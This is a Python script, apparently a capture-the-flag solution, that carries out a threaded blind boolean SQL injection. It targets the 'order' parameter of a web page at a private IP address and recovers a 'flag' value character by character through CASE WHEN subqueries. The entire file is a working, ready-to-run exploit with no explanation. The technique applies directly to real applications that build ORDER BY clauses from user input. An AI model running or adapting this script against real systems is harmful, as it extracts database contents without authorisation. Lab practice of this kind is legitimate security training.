import requests as req
import string
import concurrent.futures

url = 'http://10.201.15.212/?order='
yes = req.get(url + "title").text

def check(n,c):
    query = f'(CASE WHEN (SELECT SUBSTRING(flag,1,{n}) FROM flag)="{flag+c}" THEN title ELSE date END)'
    res = req.get(url + query).text
    if (res == yes):
        return c


with concurrent.futures.ThreadPoolExecutor() as executor:
    flag = ""
    n = 1
    chars = string.ascii_letters + string.digits + "{" + "}"
    while(1):
        results = [executor.submit(check, n, c) for c in chars]

        for future in concurrent.futures.as_completed(results):
            result = future.result()
            if (result):
                n += 1
                flag += result
                print("[+] Current flag is", flag)
                if (flag[-1:] == "}"):
                    exit()